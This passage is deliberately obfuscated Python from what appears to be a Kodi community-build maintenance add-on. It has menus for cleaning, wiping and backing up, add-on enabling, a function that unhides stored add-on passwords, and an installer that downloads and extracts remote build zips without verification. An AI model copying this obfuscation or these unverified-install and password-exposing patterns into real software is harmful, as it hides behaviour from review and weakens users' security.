  os . rename ( os . path . join ( oo0o0O00 , 'ti_id' , 'startup.xml' ) , o0 )
  xbmc . log ( "### rename ok" )
  if 90 - 90: IIIIiiII111 * ooo0O0O00 / II11iIiIIIiI
 if OO0OooOo == 1 :
  IiII1 ( )
  if 68 - 68: Iii
  if 65 - 65: oooOooOOo0OO
def o000oOOO ( url ) :
 OOo0oO00ooO00 ( 'folder' , '[COLOR=darkcyan]DELETE A BUILD[/COLOR]' , url , 'delete_profile' , '' , '' , '' )
 for OOo0 in os . listdir ( oO ) :
  if OOo0 != 'Master' and OOo0 != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   OOo0oO00ooO00 ( '' , 'Load Profile: [COLOR=dodgerblue]' + OOo0 . replace ( '_' , ' ' ) + '[/COLOR]' , OOo0 , 'switch_profile' , '' , '' , '' , '' )
   if 41 - 41: Iii / IIii1I
   if 92 - 92: IIIIiiII111 . ooo0O0O00 % OoOo0o % OOO0O0O0ooooo
def IIi1IiII ( heading , anounce ) :
 class oOooo0ooo ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try :
    Oo0oO00 = open ( anounce ) ; Iiii11i11IIi1 = Oo0oO00 . read ( )
   except :
    Iiii11i11IIi1 = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( Iiii11i11IIi1 ) )
   return
 oOooo0ooo ( )
 while xbmc . getCondVisibility ( 'Window.IsVisible(10147)' ) :
  xbmc . sleep ( 500 )
  if 91 - 91: oooOooOOo0OO / iiII11i1I1IIi
  if 16 - 16: o0o / II1 - Oo00oo0oO % o000O0o % o0o
def oOoooO0O0oOO ( url ) :
 try :
  i1111ii , Iiii11i11IIi1 = url . split ( '|' )
  IIi1IiII ( i1111ii , Iiii11i11IIi1 )
 except :
  IIi1IiII ( '' , url )
  if 43 - 43: Iii * i11iIiiIii . i11iIiiIii * II1
  if 61 - 61: o0ii1I . Oo00oo0oO . OOO0O0O0ooooo + II1 + OOO0O0O0ooooo
def Ii1Ii ( ) :
 Oo00Ooo0O0O0o = time . time ( )
 Oo0oo0o = time . localtime ( Oo00Ooo0O0O0o )
 return time . strftime ( '%Y%m%d%H%M%S' , Oo0oo0o )
 if 70 - 70: i11Iii
 if 92 - 92: IIIIiiII111 - i11Iii / i11Iii + Oo00oo0oO
def O00o0OO0O ( id , value ) :
 I1111III111ii = os . path . join ( i1iiIII111ii , id , 'addon.xml' )
 if os . path . exists ( I1111III111ii ) :
  Oo0oO00 = open ( I1111III111ii )
  Ii11iiI1 = Oo0oO00 . read ( ) . replace ( '\n' , '' ) . replace ( '\r' , '' ) . replace ( '\t' , '' )
  O0OO0O = re . compile ( '<addo.+?id="(.+?)".+?>' ) . findall ( Ii11iiI1 )
  xbmc . log ( '### ADDON ID TO STOP: %s' % O0OO0O [ 0 ] )
  o0o00O0oO = re . compile ( '<extension point=.+?ibrary="(.+?)".+?start="' ) . findall ( Ii11iiI1 )
  if len ( o0o00O0oO ) > 0 :
   xbmc . executebuiltin ( 'StopScript(%s)' % O0OO0O [ 0 ] )
 i11IiIIi11I = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}' % ( O0OO0O [ 0 ] , value )
 o000o0O0Oo00 = xbmc . executeJSONRPC ( i11IiIIi11I )
 xbmc . log ( str ( i11IiIIi11I ) )
 xbmc . log ( str ( o000o0O0Oo00 ) )
 if 'error' in o000o0O0Oo00 :
  oOooOo000O = 'Enabling' if value == 'true' else 'Disabling'
  i11 . ok ( "Community Portal" , "Error %s [COLOR yellow]%s[/COLOR]" % ( oOooOo000O , id ) , "Check to make sure the addon list is upto date and try again." )
  OoOOo0OOoO ( )
  if 33 - 33: II11iIiIIIiI
  if 22 - 22: OOO0O0O0ooooo + II11iIiIIIiI % O00ooooo00
def oo00oo ( ) :
 OOo0oO00ooO00 ( 'folder' , 'Add-on Tools' , 'none' , 'tools_addons' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Backup/Restore' , 'none' , 'backup_restore' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Clean up my Kodi' , '' , 'tools_clean' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Misc. Tools' , '' , 'tools_misc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if i1iIIi11i111I ( ) :
  OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]Wi-Fi / OpenELEC Settings[/COLOR]' , '' , 'openelec_settings' , 'mainmenu/maintenance.png' , '' , '' , '' )
  if 57 - 57: II11iIiIIIiI * o0oo + OOO0O0O0ooooo % OoOo0o - o000O0o
  if 43 - 43: OoOo0o
def IiiIIiIii ( ) :
 OOo0oO00ooO00 ( '' , 'Completely Remove An Add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Delete Addon Data' , 'url' , 'remove_addon_data' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Enable/Disable Addons' , 'true' , 'enableaddons' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Passwords - Hide when typing in' , 'none' , 'hide_passwords' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Passwords - Unhide when typing in' , 'none' , 'unhide_passwords' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 26 - 26: i11iIiiIii . II11iIiIIIiI - OOO0O0O0ooooo
 if 73 - 73: o000O0o
def OO0OOOOOOoo ( ) :
 OOo0oO00ooO00 ( '' , '[COLOR=gold]CLEAN MY KODI FOLDERS (Save Space)[/COLOR]' , '' , 'full_clean' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Clear All Cache Folders' , 'url' , 'clear_cache' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Clear Cached Artwork (thumbnails & textures)' , 'none' , 'remove_textures' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Clear Packages Folder' , 'url' , 'remove_packages' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Wipe My Install (Fresh Start)' , '' , 'wipe_xbmc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 50 - 50: oooOooOOo0OO . IIii1I % II11iIiIIIiI
 if 68 - 68: i11Iii
def OOOO0000 ( ) :
 Ooo0o = II11ii ( )
 OOo0oO00ooO00 ( '' , 'Check For Special Characters In Filenames' , '' , 'ASCII_Check' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Check My Internet Speed' , 'none' , 'speedtest_menu' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Convert Physical Paths To Special' , Oo0o0000o0o0 , 'fix_special' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if Oo . replace ( '%20' , ' ' ) in Ooo0o and Oo != '' :
  OOo0oO00ooO00 ( '' , 'Remove Community Build Protection' , 'none' , 'remove_nag' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Upload Log' , 'none' , 'uploadlog' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'View My Log' , 'none' , 'log' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'XXX - Hide my adult add-ons' , 'false' , 'adult_filter' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'XXX - Show my adult add-ons' , 'true' , 'adult_filter' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 19 - 19: IIIIiiII111 % II1 - i11iIiiIii . OOO0O0O0ooooo . IIIIiiII111 * Iii
 if 38 - 38: Iii - Iii * i11iIiiIii % oOoO0o00OO0 + o000O0o + II11iIiIIIiI
def iI11i1II ( ) :
 i11 = xbmcgui . Dialog ( )
 if i11 . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible in the add-on settings. Are you sure you wish to continue?" ) :
  for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( i1iiIII111ii ) :
   for Oo0oO00 in oO0Ooo0OooOOo :
    if Oo0oO00 == 'settings.xml' :
     IIII1iI1IiIiI = open ( os . path . join ( iiiI1IiI , Oo0oO00 ) ) . read ( )
     O0OO0O = re . compile ( '<setting id=(.+?)>' ) . findall ( IIII1iI1IiIiI )
     for i1II1 in O0OO0O :
      if 'pass' in i1II1 :
       if 'option="hidden"' in i1II1 :
        try :
         OoO = i1II1 . replace ( ' option="hidden"' , '' )
         Oo0oO00 = open ( os . path . join ( iiiI1IiI , Oo0oO00 ) , mode = 'w' )
         Oo0oO00 . write ( str ( IIII1iI1IiIiI ) . replace ( i1II1 , OoO ) )
         Oo0oO00 . close ( )
        except :
         pass
  i11 . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings. If you want to undo this please use the option to hide passwords." )
  if 70 - 70: Oo00oo0oO
  if 4 - 4: II11iIiIIIiI + i11iIiiIii + o0o
def O0OoOOo0o ( name , url , video , description , skins , guisettingslink , artpack ) :
 I11 . create ( "Backing Up Important Data" , 'Please wait...' , '' , '' )
 if 21 - 21: o0o - o000O0o / II1 . O00ooooo00 + Ooo00oOo0oOo
 if 99 - 99: OoOo0o - oOoO0o00OO0 - o000O0o - OoOo0o + o0oo + Ooo00oOo0oOo
 i11iii1II1I1 = open ( IIIII , mode = 'r' )
 IiIi11iI1IIi = i11iii1II1I1 . read ( )
 i11iii1II1I1 . close ( )
 if 5 - 5: oooOooOOo0OO + Iii
 OO0O0oooo0 = re . compile ( 'gui="(.+?)"' ) . findall ( IiIi11iI1IIi )
 ooOoo0OoO0 = OO0O0oooo0 [ 0 ] if ( len ( OO0O0oooo0 ) > 0 ) else '0'
 if 38 - 38: Oo00oo0oO - O00ooooo00 . i11iIiiIii
 if 28 - 28: OoOo0o / oooOooOOo0OO . oOoO0o00OO0
 if oO00oOo == 'true' :
  try :
   oOoo0O00OO = open ( II11iiii1Ii , mode = 'r' )
   I11II11I1 = oOoo0O00OO . read ( )
   oOoo0O00OO . close ( )
   if 27 - 27: Ooo00oOo0oOo / iiII11i1I1IIi / OOO0O0O0ooooo
  except :
   xbmc . log ( "### No favourites file to copy" )
   if 23 - 23: Oo00oo0oO + II1 / II1 % II11iIiIIIiI
 if OOOo0 == 'true' :
  try :
   IIiI = open ( OO0oOoo , mode = 'r' )
   oOOOO00o00 = IIiI . read ( )
   IIiI . close ( )
   if 66 - 66: oOoO0o00OO0 * IIIIiiII111 / II1 * OOO0O0O0ooooo % II11iIiIIIiI
  except :
   xbmc . log ( "### No sources file to copy" )
   if 49 - 49: Ooo00oOo0oOo . o000O0o * OOO0O0O0ooooo * IIIIiiII111 / OoOo0o * II1
 OOoO00OOo = 1
 oooOo ( )
 if 82 - 82: iiII11i1I1IIi / IIIIiiII111 / IIIIiiII111 % IIIIiiII111
 if 20 - 20: i11Iii
 if os . path . exists ( i1I1iI ) :
  if 63 - 63: IIii1I . o0oo
  if os . path . exists ( iiI1IiI ) :
   os . remove ( i1I1iI )
   if 100 - 100: O00ooooo00 * O00ooooo00
  else :
   os . rename ( i1I1iI , iiI1IiI )
   if 26 - 26: II11iIiIIIiI . o0oo % Iii
 if os . path . exists ( II ) :
  os . remove ( II )
  if 94 - 94: Oo00oo0oO
  if 15 - 15: IIIIiiII111 - Oo00oo0oO / OOO0O0O0ooooo
 if not os . path . exists ( I11II1i ) :
  IIIIIiI11Ii = open ( I11II1i , mode = 'w+' )
  IIIIIiI11Ii . close ( )
  if 28 - 28: OoOo0o . O00ooooo00 / oOoO0o00OO0
 I11 . close ( )
 I11 . create ( "Downloading Skin Fix" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 OOo00oOo = os . path . join ( I11i1 , 'guifix.zip' )
 if 77 - 77: i11iIiiIii / OoOo0o / i11iIiiIii % Iii - OoOo0o
 if 80 - 80: OoOo0o % Iii . II1 . Ooo00oOo0oOo % Oo00oo0oO
 try :
  xbmc . log ( "### attempting to download guisettings.xml" )
  downloader . download ( guisettingslink , OOo00oOo , I11 )
  I11 . close ( )
 except :
  i11 . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
  xbmc . log ( "### FAILED to download %s" % guisettingslink )
  if 6 - 6: OoOo0o % Oo00oo0oO / IIIIiiII111 + OoOo0o . oooOooOOo0OO
  if 70 - 70: IIii1I / IIIIiiII111
 if zipfile . is_zipfile ( OOo00oOo ) :
  i11ii11IiI1 = str ( os . path . getsize ( OOo00oOo ) )
  if 61 - 61: OOO0O0O0ooooo * o0ii1I + OoOo0o - II11iIiIIIiI . o000O0o - Oo00oo0oO
 else :
  i11ii11IiI1 = ooOoo0OoO0
  if 7 - 7: oOoO0o00OO0
  if 81 - 81: iiII11i1I1IIi % Ooo00oOo0oOo % o0ii1I / o0o
 IIIIIiI11Ii = open ( I11II1i , mode = 'r' )
 oOo0O = IIIIIiI11Ii . read ( )
 IIIIIiI11Ii . close ( )
 if 95 - 95: Iii - OOO0O0O0ooooo % II1
 Iiiiii = re . compile ( 'id="(.+?)"' ) . findall ( oOo0O )
 OOoo000o = re . compile ( 'name="(.+?)"' ) . findall ( oOo0O )
 O000OoOO0oO = re . compile ( 'version="(.+?)"' ) . findall ( oOo0O )
 if 13 - 13: i11iIiiIii
 iII1o00OO0 = Iiiiii [ 0 ] if ( len ( Iiiiii ) > 0 ) else ''
 Ooii = OOoo000o [ 0 ] if ( len ( OOoo000o ) > 0 ) else ''
 oO0o0oo0O0 = O000OoOO0oO [ 0 ] if ( len ( O000OoOO0oO ) > 0 ) else ''
 if 54 - 54: II11iIiIIIiI . oOoO0o00OO0 * o0o % OoOo0o . OOO0O0O0ooooo * Oo00oo0oO
 if os . path . exists ( oo0OooOOo0 ) :
  os . removedirs ( oo0OooOOo0 )
  if 87 - 87: IIIIiiII111 % oOoO0o00OO0 * iiII11i1I1IIi
  if 59 - 59: iiII11i1I1IIi / o0o - IIii1I * IIii1I
 if ooOoo0OoO0 != i11ii11IiI1 :
  try :
   os . rename ( iiI1IiI , i1I1iI )
   if 18 - 18: o0o * oOoO0o00OO0 / i11iIiiIii / IIii1I * II1 . II11iIiIIIiI
  except :
   i11 . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit Kodi and try again' , '' )
   return
   if 69 - 69: iiII11i1I1IIi * i11Iii
   if 91 - 91: o0ii1I . i11Iii / o0oo / i11iIiiIii * o0ii1I
 if video != 'fresh' :
  oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before installing any community builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
  if 52 - 52: o000O0o - i11iIiiIii / Oo00oo0oO . oooOooOOo0OO
  if oO000o0Oo00 == 0 :
   OoOo0O0O = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' ) )
   if 38 - 38: oooOooOOo0OO + II1 * Iii % oooOooOOo0OO
   if not os . path . exists ( OoOo0O0O ) :
    os . makedirs ( OoOo0O0O )
    if 91 - 91: O00ooooo00 - oOoO0o00OO0 * o000O0o
   O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
   if 24 - 24: Iii * IIIIiiII111
   if ( not O0O0 ) :
    return False , 0
    if 17 - 17: o0oo . o000O0o * OOO0O0O0ooooo
   oOIIII = urllib . quote_plus ( O0O0 )
   ooOOo = xbmc . translatePath ( os . path . join ( OoOo0O0O , oOIIII + '.zip' ) )
   i1iii1IiiiI1i1 = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
   IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
   I111iiiii1 = "Creating full backup of existing build"
   OO0ooOoOO0OOo = "Archiving..."
   OooOoooo0000 = ""
   I1ii1i11i = "Please Wait"
   o00Ooo0 ( Oo0o0000o0o0 , ooOOo , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
   if 81 - 81: II11iIiIIIiI
 oo0O0 = open ( IIIII , mode = 'w+' )
 if 58 - 58: Ooo00oOo0oOo . OoOo0o . IIIIiiII111 * II1 / IIIIiiII111 / o0o
 if ooOoo0OoO0 != i11ii11IiI1 :
  oo0O0 . write ( 'id="' + str ( iII1o00OO0 ) + '"\nname="' + Ooii + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + oO0o0oo0O0 + '"\ngui="' + i11ii11IiI1 + '"' )
  if 41 - 41: o0o + o0oo . ooo0O0O00
 else :
  oo0O0 . write ( 'id="' + str ( iII1o00OO0 ) + '"\nname="' + Ooii + '"\nversion="' + oO0o0oo0O0 + '"\ngui="' + i11ii11IiI1 + '"' )
 oo0O0 . close ( )
 if 73 - 73: i11iIiiIii * o000O0o + o0ii1I / oooOooOOo0OO
 if 56 - 56: O00ooooo00
 if video == 'libprofile' or video == 'library' or video == 'updatelibprofile' or video == 'updatelibrary' :
  try :
   shutil . copytree ( oO0o0o0ooO0oO , o0OO00oO , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 11 - 11: i11iIiiIii % o0ii1I / o0o * II1
  except :
   OOoO00OOo = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if 82 - 82: Oo00oo0oO
   if OOoO00OOo == 0 :
    return
    if 10 - 10: iiII11i1I1IIi % II11iIiIIIiI / o0o * Oo00oo0oO - o0ii1I
  ooOOo = xbmc . translatePath ( os . path . join ( I11i1 , 'Database.zip' ) )
  I11I1i1iI ( o0OO00oO , ooOOo )
  if 54 - 54: i11iIiiIii / IIii1I % oOoO0o00OO0 / o000O0o . IIii1I / ooo0O0O00
 if OOoO00OOo == 0 :
  return
  if 1 - 1: OoOo0o / Iii * Iii - o0ii1I % IIIIiiII111
 time . sleep ( 1 )
 if 96 - 96: Oo00oo0oO / IIIIiiII111 % o0oo . IIii1I
 if 30 - 30: o0o - o0oo
 iiii = xbmc . translatePath ( os . path . join ( Oo0o0000o0o0 , '..' , 'koditemp.zip' ) )
 time . sleep ( 2 )
 I11 . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 IIii1Ii = description . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
 OOo00oOo = os . path . join ( iIi1ii1I1 , IIii1Ii + '.zip' )
 if 62 - 62: IIii1I % OoOo0o % oOoO0o00OO0 * Oo00oo0oO
 if not os . path . exists ( iIi1ii1I1 ) :
  os . makedirs ( iIi1ii1I1 )
  if 87 - 87: Oo00oo0oO
 downloader . download ( url , OOo00oOo , I11 )
 if 45 - 45: oooOooOOo0OO + Ooo00oOo0oOo * OOO0O0O0ooooo % II11iIiIIIiI . IIii1I
 if 55 - 55: Oo00oo0oO
 try :
  iiii11IiI1 = open ( Oo00OOOOO , mode = 'r' )
  IiiIiOoO0o00o = iiii11IiI1 . read ( )
  iiii11IiI1 . close ( )
 except :
  xbmc . log ( "### No profiles detected, most likely a fresh wipe performed" )
  if 46 - 46: ooo0O0O00 + OoOo0o % II1 * oOoO0o00OO0
 I11 . close ( )
 I11 . create ( "Community Builds" , "Checking " , '' , 'Please Wait' )
 if 89 - 89: Oo00oo0oO - Oo00oo0oO % ooo0O0O00 / o0o + oooOooOOo0OO - Oo00oo0oO
 if 97 - 97: IIIIiiII111 % Iii / oOoO0o00OO0 / IIii1I * II1 * II11iIiIIIiI
 if zipfile . is_zipfile ( OOo00oOo ) :
  I11 . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( OOo00oOo , Oo0o0000o0o0 , I11 )
  if 80 - 80: oooOooOOo0OO / OOO0O0O0ooooo
 else :
  i11 . ok ( 'Not a valid zip file' , 'This file is not a valid zip file, please let the build author know on their support thread so they can amend the download path. It\'s most likely just a simple typo on their behalf.' )
  return
  if 55 - 55: o000O0o * o0o / OOO0O0O0ooooo % Iii
 I11 . create ( "Restoring Dependencies" , "Checking " , '' , 'Please Wait' )
 I11 . update ( 0 , "" , "Extracting Zip Please Wait" )
 if 71 - 71: i11iIiiIii * Iii * II11iIiIIIiI + oooOooOOo0OO + iiII11i1I1IIi
 if oO00oOo == 'true' :
  try :
   xbmc . log ( "### Attempting to add back favourites ###" )
   oo0O0 = open ( II11iiii1Ii , mode = 'w+' )
   oo0O0 . write ( I11II11I1 )
   oo0O0 . close ( )
   I11 . update ( 0 , "" , "Copying Favourites" )
  except :
   xbmc . log ( "### Failed to copy back favourites" )
   if 59 - 59: Oo00oo0oO
 if OOOo0 == 'true' :
  try :
   xbmc . log ( "### Attempting to add back sources ###" )
   oo0O0 = open ( OO0oOoo , mode = 'w+' )
   oo0O0 . write ( oOOOO00o00 )
   oo0O0 . close ( )
   I11 . update ( 0 , "" , "Copying Sources" )
   if 54 - 54: II11iIiIIIiI
  except :
   xbmc . log ( "### Failed to copy back sources" )
   if 27 - 27: Iii - o0oo + o0ii1I + i11Iii . o0oo
 time . sleep ( 1 )
 if os . path . exists ( o0OO00oO ) :
  shutil . rmtree ( o0OO00oO )
  if 86 - 86: Ooo00oOo0oOo - II1 - i11Iii % ooo0O0O00
  if 16 - 16: i11Iii + iiII11i1I1IIi + II1
 if os . path . exists ( o0 ) :
  IIIIIiI11Ii = open ( o0 , mode = 'r' )
  oOo0O = IIIIIiI11Ii . read ( )
  IIIIIiI11Ii . close ( )
  iIiiI1I = re . compile ( 'version="[\s\S]*?"' ) . findall ( oOo0O )
  O0Oo000ooO00 = iIiiI1I [ 0 ] if ( len ( iIiiI1I ) > 0 ) else ''
  iIIIiIi = oOo0O . replace ( O0Oo000ooO00 , 'version="' + oO0o0oo0O0 + '"' )
  oo0O0 = open ( o0 , mode = 'w' )
  oo0O0 . write ( str ( iIIIiIi ) )
  oo0O0 . close ( )
  if 87 - 87: o000O0o . oooOooOOo0OO / Oo00oo0oO - II1
 else :
  oo0O0 = open ( o0 , mode = 'w+' )
  oo0O0 . write ( 'date="01011001"\nversion="' + oO0o0oo0O0 + '"' )
  oo0O0 . close ( )
  if 33 - 33: oooOooOOo0OO % o0oo . IIii1I / Oo00oo0oO
  if 3 - 3: IIIIiiII111 + o0oo
 if IIi1IiiiI1Ii == 'false' :
  os . remove ( OOo00oOo )
  if 60 - 60: o0oo . Iii - oOoO0o00OO0 - o000O0o - Ooo00oOo0oOo % iiII11i1I1IIi
  if 62 - 62: OOO0O0O0ooooo + ooo0O0O00 - ooo0O0O00 % IIii1I
 if 'prof' in video :
  try :
   i1III1i = open ( Oo00OOOOO , mode = 'w+' )
   i1III1i . write ( IiiIiOoO0o00o )
   i1III1i . close ( )
  except :
   xbmc . log ( "### Failed to write existing profile info back into profiles.xml" )
   if 39 - 39: Ooo00oOo0oOo - IIIIiiII111 / oooOooOOo0OO . Oo00oo0oO % o000O0o
   if 18 - 18: II1 * Iii . Ooo00oOo0oOo + OOO0O0O0ooooo - II1 * o0ii1I
 if video == 'library' or video == 'libprofile' or video == 'updatelibprofile' or video == 'updatelibrary' :
  extract . all ( ooOOo , oO0o0o0ooO0oO , I11 )
  if 26 - 26: i11iIiiIii % oOoO0o00OO0 * II11iIiIIIiI / i11iIiiIii
  if 49 - 49: O00ooooo00 - Iii - o0o * o000O0o . i11Iii
  if OOoO00OOo != 1 :
   shutil . rmtree ( o0OO00oO )
 try :
  I11 . close ( )
 except :
  pass
  if 24 - 24: i11Iii
  if 79 - 79: O00ooooo00 . o0o % o0oo % Oo00oo0oO - oooOooOOo0OO - i11iIiiIii
 if os . path . exists ( oOOoo0Oo ) :
  o00oo0OO0 ( description )
  if 97 - 97: oOoO0o00OO0 / II1 % o0oo
  try :
   os . remove ( oOOoo0Oo )
   if 55 - 55: o0oo * o0ii1I - o0o + IIii1I . o0oo + oooOooOOo0OO
  except :
   xbmc . log ( "###' Failed to remove: %s" % oOOoo0Oo )
   if 4 - 4: IIIIiiII111
  try :
   shutil . rmtree ( oO0Oo )
   if 43 - 43: O00ooooo00 . o000O0o * IIii1I * i11iIiiIii - II11iIiIIIiI + i11Iii
  except :
   xbmc . log ( "###' Failed to remove: %s" % oO0Oo )
   if 56 - 56: iiII11i1I1IIi % i11iIiiIii / IIIIiiII111 . OoOo0o . o0oo - Iii
 else :
  xbmc . log ( "### Community Builds - using an old build" )
  if 32 - 32: OoOo0o / oooOooOOo0OO / o000O0o
  if 22 - 22: o0oo - Iii . iiII11i1I1IIi + o0ii1I
 if ooOoo0OoO0 != i11ii11IiI1 :
  xbmc . log ( "### GUI SIZE DIFFERENT ATTEMPTING MERGE ###" )
  oOoo0ooo0 = os . path . join ( Oo0o0000o0o0 , 'newbuild' )
  if 97 - 97: O00ooooo00 % II1
  if not os . path . exists ( oOoo0ooo0 ) :
   os . makedirs ( oOoo0ooo0 )
   if 83 - 83: o0o . II11iIiIIIiI + OoOo0o * o0o . OoOo0o + oooOooOOo0OO
  os . makedirs ( oo0OooOOo0 )
  time . sleep ( 1 )
  i11II ( guisettingslink , video )
  time . sleep ( 1 )
  IiII1 ( )
  i11 . ok ( "Force Close Required" , "If you\'re seeing this message it means the force close was unsuccessful. Please close XBMC/Kodi via your operating system or pull the power." )
  if 64 - 64: IIIIiiII111 . o0ii1I - O00ooooo00
 if ooOoo0OoO0 == i11ii11IiI1 :
  i11 . ok ( 'Successfully Updated' , 'Congratulations the following build:[COLOR=dodgerblue]' , description , '[/COLOR]has been successfully updated!' )
  if 35 - 35: oOoO0o00OO0 % II1
  if 59 - 59: o000O0o % o0o
def iiIiiIi1iiiIi ( ) :
 if I1IiiI . getSetting ( 'email' ) == '' :
  i11 . ok ( "No Email Address Set" , "A new window will Now open for you to enter your Email address. The logfile will be sent here" )
  I1IiiI . openSettings ( )
 uploadLog . Main ( )
 if 48 - 48: iiII11i1I1IIi - o0oo . o0o - IIii1I % IIIIiiII111
 if 47 - 47: ooo0O0O00 / II1 - Ooo00oOo0oOo
def oOoOo0 ( info ) :
 if os . path . exists ( IIiiiiiiIi1I1 ) :
  o0o0O0O00oOOo = open ( IIiiiiiiIi1I1 , 'r' )
  oOo0O = o0o0O0O00oOOo . read ( )
  o0o0O0O00oOOo . close ( )
  ooo0O0Oo0O = re . compile ( 'l="(.+?)"' ) . findall ( oOo0O )
  OooIii1I1iI = ooo0O0Oo0O [ 0 ] if ( len ( ooo0O0Oo0O ) > 0 ) else ''
  oOOooo = re . compile ( 'p="(.+?)"' ) . findall ( oOo0O )
  oOO00o0oooOo0 = oOOooo [ 0 ] if ( len ( oOOooo ) > 0 ) else '0'
  if oOO00o0oooOo0 != '0' :
   oOO00o0oooOo0 = binascii . unhexlify ( oOO00o0oooOo0 )
  if OooIii1I1iI != '' :
   OooIii1I1iI = binascii . unhexlify ( OooIii1I1iI )
  if 'Welcome Back' in OooIii1I1iI and Oo . replace ( '%20' , '' ) in OooIii1I1iI and info == 'posts' :
   return oOO00o0oooOo0
  if 'Welcome Back' in OooIii1I1iI and Oo . replace ( '%20' , '' ) in OooIii1I1iI and info == 'welcometext' :
   return OooIii1I1iI
  else :
   return 'False'
 else :
  return 'False'
  if 9 - 9: O00ooooo00 % OoOo0o - o0oo * Iii . o0ii1I
  if 18 - 18: IIIIiiII111 . Iii + ooo0O0O00 . o000O0o + II1 . o0oo
def i11I1IiIi ( localbuildcheck , localversioncheck , localidcheck ) :
